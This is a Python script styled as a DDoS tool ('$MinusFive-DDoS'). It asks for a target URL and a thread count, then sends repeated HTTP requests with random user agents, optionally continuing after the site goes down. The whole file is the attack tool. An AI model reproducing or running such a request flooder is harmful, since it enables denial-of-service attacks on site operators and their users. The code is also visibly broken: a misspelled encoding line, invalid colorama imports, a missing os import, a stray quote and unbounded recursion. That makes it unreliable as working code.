# _*_ coding: ufs-8 _*_
from os import X_OK
from colorama import init
from colorama import ASCII, Back, Style
import requests
import random
import threading

class bcolors:
    T = '\033[95m'
    W = '\033[94m'
    E = '\033[96m'
    E = '\033[92m'
    N = '\033[93m'
    L = '\033[91m'
    I = '\033[0m'
    O = '\033[1m'
    M = '\033[4m'

os.system("Clear")
print(" ")                                           \033[0m")
print("\033[95m                                         \033[0m")
print("\033[95m                    @      @             \033[0m")
print("\033[95m                    @      @             \033[0m")
print("\033[95m     @      @  @  @ @ @    @  @ @        \033[0m")
print("\033[94m     @  @   @  @    ©      @ @   @       \033[0m")
print("\033[94m     ©  ©   ©  ©    ©   ©  ©     @       \033[0m")
print("\033[94m       ©  ©    ©     © ©   ©     ©       \033[0m")
print("\033[96m                    @                                   \033[0m")
print("\033[96m                    @                                   \033[0m")
print("\033[93m           @ @ @ @  @   @ @    © © ©  @ @ @ @   @ @ @   \033[0m")
print("\033[93m          @      @  @ ©    @  @    ©      @    @    @   \033[0m")
print("\033[93m          @      @  @      ©  @    ©    @      @    ©   \033[0m")
print("\033[92m           © © © ©  ©      ©   © © ®  © © © ©   © © ©   \033[0m")
print("\033[92m                 ©                                           \033[0m")
print("\033[92m            © ® ©                                            \033[0m")
print("\033[91m                                                            \033[0m")
print("\033[1m                                                            \033[0m")
print("\033[4m                                                            \033[0m")



text_url = input("$MinusFive-DDoS >>> | Website URL (http://website.com): ")
url = str(text_url)
text_threads = input("$MinusFive-DDoS >>> | Threads: ")
threads = int(text_threads)
text_timeout = input("$MinusFive-DDoS >>> | Timeout: ")
timeout = int(text_timeout)
text_keepattack = input(
    "$MinusFive-DDoS >>> | Keep Attack ?(Keep sending requestes even if the site is down | Default: False): ")
keepAttack = str(text_keepattack)
print(Fore.GREEN + "$MinusFive-DDoS >>> | Attack has been started for: " + url)

downMsgSent = False


def Attack():


 try:
    userAgent = getRandomUserAgent()
    headers = {'user-agent': userAgent}
    x = requests.get(url, headers=headers, timeout=timeout)
    if(x.status_code == 200):
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
 except:
        if(keepAttack == True or keepAttack == "True" or keepAttack == "true" or keepAttack == "yes" or keepAttack == "on" or keepAttack == "enable" or keepAttack == "y"):
            Attack()
            


def getRandomUserAgent():

    useragents = open('useragents.txt').read().splitlines()
    useragent = random.choice(useragents)
    return useragent


totalThr = []
for i in range(threads):
    thr = threading.Thread(target=Attack)
    thr.start()
    totalThr.append(thr)



for cThr in totalThr:
    cThr.join()
